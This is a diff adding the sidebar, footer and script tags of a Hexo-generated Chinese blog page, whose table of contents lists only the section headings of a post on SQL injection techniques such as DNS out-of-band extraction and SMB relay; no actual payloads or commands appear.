+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/KidHat" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#测试注入"><span class="nav-number">1.</span> <span class="nav-text">测试注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注释符"><span class="nav-number">2.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#版本-amp-主机名-amp-用户-amp-库名"><span class="nav-number">3.</span> <span class="nav-text">版本&主机名&用户&库名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#表和字段"><span class="nav-number">4.</span> <span class="nav-text">表和字段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#确定字段数"><span class="nav-number">4.1.</span> <span class="nav-text">确定字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ORDER-BY"><span class="nav-number">4.1.1.</span> <span class="nav-text">ORDER BY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SELECT-…-INTO"><span class="nav-number">4.1.2.</span> <span class="nav-text">SELECT … INTO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断已知表名的字段数"><span class="nav-number">4.1.3.</span> <span class="nav-text">判断已知表名的字段数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查表名"><span class="nav-number">4.2.</span> <span class="nav-text">查表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查列名"><span class="nav-number">4.3.</span> <span class="nav-text">查列名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符串连接"><span class="nav-number">5.</span> <span class="nav-text">字符串连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#条件语句-amp-时间函数"><span class="nav-number">6.</span> <span class="nav-text">条件语句&时间函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件操作"><span class="nav-number">7.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件操作权限"><span class="nav-number">7.1.</span> <span class="nav-text">文件操作权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-number">7.2.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写文件"><span class="nav-number">7.3.</span> <span class="nav-text">写文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#带外通道"><span class="nav-number">8.</span> <span class="nav-text">带外通道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是带外通道注入？"><span class="nav-number">8.1.</span> <span class="nav-text">什么是带外通道注入？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件限制"><span class="nav-number">8.2.</span> <span class="nav-text">条件限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS注入"><span class="nav-number">8.3.</span> <span class="nav-text">DNS注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SMB-Relay-注入攻击"><span class="nav-number">9.</span> <span class="nav-text">SMB Relay 注入攻击</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">KidHat</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
